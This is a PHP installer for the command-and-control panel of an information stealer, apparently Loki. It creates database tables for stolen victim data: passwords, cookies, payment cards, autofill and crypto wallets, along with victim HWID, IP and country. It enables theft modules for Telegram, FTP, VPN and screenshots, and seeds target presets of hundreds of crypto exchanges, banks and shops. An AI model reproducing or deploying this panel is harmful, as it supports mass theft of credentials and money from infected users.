<?php
//error_reporting( E_ERROR );
//ini_set('error_reporting', 0);
//ini_set('display_errors', 0);
$phpZip = extension_loaded('zip');
$db_server 		= 	checkParam($_POST["db_server"]);
$db_user 		= 	checkParam($_POST["db_user"]);
$db_password 	= 	checkParam($_POST["db_password"]);
$db_name 		= 	checkParam($_POST["db_name"]);

$adm_login 		= 	checkParam($_POST["adm_login"]);
$adm_password 	= 	checkParam($_POST["adm_password"]);

$error = "";
if(isset($_POST['install'])){
if
(
	$db_server 		!= null &
	$db_user 		!= null &
	$db_name 		!= null &
	$db_password	!= null &
	$adm_login 		!= null &
	$adm_password 	!= null
)
{
	$config_file = fopen("database.php", "w");
	$configuration = '<?php
$databaseHost = "'.$db_server.'";
$databaseUser = "'.$db_user.'";
$databaseName = "'.$db_name.'";
$databasePassword = "'.$db_password.'";
$pdoConnection = new PDO("mysql:host=$databaseHost;dbname=$databaseName", $databaseUser, $databasePassword);

//Auth
$login = "'.$adm_login.'";
$md5Password = "'.md5($adm_password).'";

?>';
	
	fwrite($config_file, $configuration);
	fclose($config_file);
}

else
{
	$error = "Please enter all params!";
}
try
{
	include(dirname(__FILE__)."/database.php");
}
catch(Exception $e)
{
    $error = "Can't connect to database.";
}
if(isset($pdoConnection))
{
	$pdoConnection->exec('SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";');
	$pdoConnection->exec('SET time_zone = "+00:00";');
	$pdoConnection->exec('CREATE TABLE `grabber` (
  `id` int(11) NOT NULL,
  `name` text NOT NULL,
  `folder` text NOT NULL,
  `pattern` text NOT NULL,
  `exception` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;');
	$pdoConnection->exec("CREATE TABLE `logs` (
  `id` int(11) NOT NULL,
  `userID` text NOT NULL,
  `hwid` text NOT NULL,
  `system` text NOT NULL,
  `ip` text NOT NULL,
  `country` text NOT NULL,
  `date` text NOT NULL,
  `count` int(11) DEFAULT NULL,
  `cookie` int(11) DEFAULT NULL,
  `pswd` int(11) DEFAULT NULL,
  `buildversion` text,
  `credit` int(11) DEFAULT '0',
  `autofill` int(11) DEFAULT '0',
  `wallets` int(11) DEFAULT '0',
  `checked` int(11) NOT NULL DEFAULT '0',
  `comment` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;");

$pdoConnection->exec("CREATE TABLE `presets` (
  `id` int(11) NOT NULL,
  `name` text NOT NULL,
  `color` text NOT NULL,
  `pattern` text NOT NULL
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;");
$pdoConnection->exec("INSERT INTO `presets` (`id`, `name`, `color`, `pattern`) VALUES
(0, 'Crypto', 'MEDIUMVIOLETRED', 'freewallet.org;paxful.com;capdax.com;wazirx.com;okex.com;bitfinex.com;hitbtc.com;kraken.com;gateio.io;bitstamp.net;bittrex.com;exmo;yobit;poloniex.com;bitflyer.jp;livecoin.net;wex.nz;cryptonator;mercatox.com;localbitcoins.com;localbitcoins.net;luno.;coinpayments;therocktrading.com;etherdelta.com;anxpro.com;c-cex.com;gatecoin.com;kiwi-coin.com;jubi.com;koineks.com;ecoin.cc;koinim.com;litebit.eu;lykke.com;mangr.com;localtrade.pro;lbank.info;leoxchange.com;liqui.io;kuna.io;fybse.se;freiexchange.com;fybsg.com;gatehub.net;getbtc.org;gemini.com;gdax.com;foxbit.com.br;foxbit.exchange;flowbtc.com.br;exx.com;exrates.me;excambriorex.com;ezbtc.ca;fargobase.com;fisco.co.uk;glidera.io;indacoin.com;ethexindia.com;indx.ru;infinitycoin.exchange;idex.su;idex.market;ice3x.com;ice3x.co.za;guldentrader.com;exchange.guldentrader.com;heatwallet.com;hypex.nl;negociecoins.com.br;topbtc.com;tidex.com;tidebit.com;tradesatoshi.com;urdubit.com;tuxexchange.com;tdax.com;spacebtc.com;surbitcoin.com;surbtc.com;usd-x.com;xbtce.com;yunbi.com;zyado.com;trade.z.com;zaif.jp;wavesplatform.com;walltime.info;vbtc.exchange;vaultoro.com;vircurex.com;virtacoinworld.com;vwlpro.com;nlexch.com;nevbit.com;nocks.com;novaexchange.com;nxtplatform.org;neraex.pro;mixcoins.com;mr-ripple.com;dsx.uk;nzbcx.com;okcoin.com;quadrigacx.com;quoinex.com;rightbtc.com;ripplefox.com;rippex.net;openledger.info;paymium.com;paribu.com;mercadobitcoin.com.br;dcexe.com;bitmex.com;bitmaszyna.pl;bitonic.nl;bitpanda.com;bitsblockchain.net;bitmarket.net;bitlish.com;bitfex.trade;bitexbook.com;bitex.la;bitflip.cc;bitgrail.com;bitkan.com;bitinka.com;bitholic.com;bitsane.com;changer.com;bitshares.org;btcmarkets.net;braziliex.com;btc-trade.com.ua;btc-alpha.com;bl3p.eu;bitssa.com;bitspark.io;bitso.com;bitstar.com;ittylicious.com;altcointrader.co.za;arenabitcoin;allcoin.com;abucoins.com;aidosmarket.com;aex.com;acx.com;bancor.network;bitbay.net;indodax.com;bitcointrade.com.br;bitcointoyou.com;bitbanktrade.jp;bitbank.com;big.one;bcex.ru;bitconnect.co;bisq.network;bit2c.co.il;bit-z.com;btcbear.com;btcbox.in;counterwallet.io;freewallet.io;indiesquare.me;rarepepewallet.com;coss.io;coolcoin.com;crex24.com;cryptex.net;coinut.com;coinsbank.com;coinsecure.in;coinsquare.com;coinsquare.io;coinspot.io;coinmarketcap.com;crypto-bridge.org;dcex.com;dabtc.com;decentrex.com;deribit.com;dgtmarket.com;cryptomkt.com;cryptoderivatives.market;cryptodao.com;cryptomate.co.uk;cryptox.pl;cryptopia.co.nz;coinroom.com;coinrate.net;chbtc.com;chilebit.net;coinbase.com;burst-coin.org;poloniex.com;btcc.;binance;btcc.net;btc-trade.com.ua;btctrade.im;btcturk.com;btcxindia.com;coincheck.com;coinmate.io;coingi.com;coinnest.co.kr;coinrail.co.kr;coinpit.io;coingather.com;coinfloor.co.uk;coinegg.com;coincorner.com;coinexchange.io;coinfalcon.com;digatrade.com;btc-alpha.com;blockchain;minergate;myetherwallet.com;litevault.net;dogechain.info;coinome;bitbns;btc.top;etherdelta.com;btcbank.com.ua;coindelta.com;depotwallet.com;kryptex.org'),
(1, 'Shop', 'green', 'amazon;ebay;walmart;newegg;apple;bestbuy'),
(2, 'Money', 'GOLD', 'paypal;chase.com;TD;wells;capitalone;skrill;PayU'),
(3, 'Game', 'MEDIUMSLATEBLUE', 'steam;origin;ubi.com');");

$pdoConnection->exec('CREATE TABLE `settings` (
  `id` int(11) NOT NULL,
  `cisLogs` text NOT NULL,
  `repeatLogs` text NOT NULL,
  `telegram` text NOT NULL,
  `history` text NOT NULL,
  `autocomplete` text NOT NULL,
  `cards` text NOT NULL,
  `cookies` text NOT NULL,
  `passwords` text NOT NULL,
  `jabber` text NOT NULL,
  `ftp` text NOT NULL,
  `screenshot` text NOT NULL,  
  `selfDelete` text NOT NULL,
  `vpn` text NOT NULL,
  `grabber` text NOT NULL,
  `executionTime` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;');

$pdoConnection->exec("INSERT INTO `settings` (`id`, `cisLogs`, `repeatLogs`, `telegram`, `history`, `autocomplete`, `cards`, `cookies`, `passwords`, `jabber`, `ftp`, `screenshot`, `selfDelete`, `vpn`, `grabber`, `executionTime`) VALUES
(0, 'on', 'on', 'on', 'on', 'on', 'on', 'on', 'on', 'on', 'on', 'on', 'on', 'on', 'off', '0');");

$pdoConnection->exec('CREATE TABLE `tasks` (
  `id` int(11) NOT NULL,
  `name` text NOT NULL,
  `count` int(11) NOT NULL,
  `country` text NOT NULL,
  `task` text NOT NULL,
  `preset` text NOT NULL,
  `params` text NOT NULL,  
  `status` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;'); 
$pdoConnection->exec('ALTER TABLE `grabber`
  ADD PRIMARY KEY (`id`);');
$pdoConnection->exec('ALTER TABLE `logs`
  ADD PRIMARY KEY (`id`);');
$pdoConnection->exec('ALTER TABLE `presets`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `id` (`id`),
  ADD UNIQUE KEY `id_2` (`id`);');
$pdoConnection->exec('ALTER TABLE `settings`
  ADD PRIMARY KEY (`id`);');
$pdoConnection->exec('ALTER TABLE `tasks`
  ADD PRIMARY KEY (`id`);');
$pdoConnection->exec('ALTER TABLE `grabber`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;');
$pdoConnection->exec('ALTER TABLE `presets`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=4;');
$pdoConnection->exec('ALTER TABLE `tasks`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;');
 $pdoConnection->exec('ALTER TABLE `logs`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;');
$pdoConnection->exec('ALTER TABLE `grabber`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;');
 
	header('Location: index.php?install=true', true, 301);
	die();
}
else
{
	 $error = "Can't connect to database.";
}
}
function checkParam($param)
{
	$formatted = $param;
	$formatted = trim($formatted);
	$formatted = stripslashes($formatted);
	$formatted = htmlspecialchars($formatted);
	
	return $formatted;
}
?>
<!doctype html>
<html lang="en-us">
<head>
	<meta charset="utf-8">
	<meta http-equiv="x-ua-compatible" content="ie=edge">
	<title>Install</title>
	<meta name="viewport" content="width=device-width, initial-scale=1">
	
	<link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,400i,600,700" rel="stylesheet">
	
	<link rel="apple-touch-icon" href="apple-touch-icon.png">
	<link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
	
	<link rel="stylesheet" href="assets/css/bootstrap.min.css">
</head>
<body>
	<br>
	<br>
	
	<div class="container">
		<form role="form" method="post">
		<div class="row">
		<div class="col-6 mx-auto">
					<?php
					if($error != "")
					{
						?>
						<div class="alert alert-danger" role="alert">
										<?php echo $error; ?>
						</div>
						<?php
					}
					if(!$phpZip){
						?>
						<div class="alert alert-danger" role="alert">
							Please install PHP-ZIP before using panel.
						</div>
					
					<?php
					}
					?>
				
               <div class="card widget-flat">
                  <div class="card-body p-0">
                     <div class="p-3 pb-0">
						<h4 class="card-header">Database info</h4>						
						<div class="form-group row">
                                        <label class="col-sm-4 col-form-label">Server Address</label>
                                        <div class="col-sm-12">
                                            <input class="form-control" name="db_server" type="text" placeholder="localhost" value="localhost">
                                        </div>
                                    </div>		
									<div class="form-group row">
                                        <label class="col-sm-4 col-form-label">Username</label>
                                        <div class="col-sm-12">
                                            <input class="form-control" name="db_user" type="text" placeholder="root">
                                        </div>
                                    </div>
									<div class="form-group row">
                                        <label class="col-sm-4 col-form-label">Password</label>
                                        <div class="col-sm-12">
                                            <input class="form-control" name="db_password" type="password" placeholder="toor">
                                        </div>
                                    </div>	
									<div class="form-group row">
                                        <label class="col-sm-4 col-form-label">Database name</label>
                                        <div class="col-sm-12">
                                            <input class="form-control"  name="db_name" type="text" placeholder="loki">
                                        </div>
                                    </div>					          
                     </div>
                  </div>
               </div>
			        <div class="card widget-flat">
                  <div class="card-body p-0">
                     <div class="p-3 pb-0">
						<h4 class="card-header">Server info</h4>
						<div class="form-group row">
                                        <label class="col-sm-4 col-form-label">Login</label>
                                        <div class="col-sm-12">
                                            <input class="form-control" name="adm_login" type="text" placeholder="admin">
                                        </div>
                                    </div>	
									<div class="form-group row">
                                        <label class="col-sm-4 col-form-label">Password</label>
                                        <div class="col-sm-12">
                                            <input class="form-control"  name="adm_password" type="password" placeholder="admin">
                                        </div>
                                    </div>	
							<center>
							<button type="submit" name="install" <?php if(!$phpZip)echo "disabled"; ?> class="btn btn-secondary btn-sm">Install</button></center>
								
								</div>
                  </div>
               </div>
            </div>
			</div>

			</form>
			
		</div>
	</div>
</body>
</html>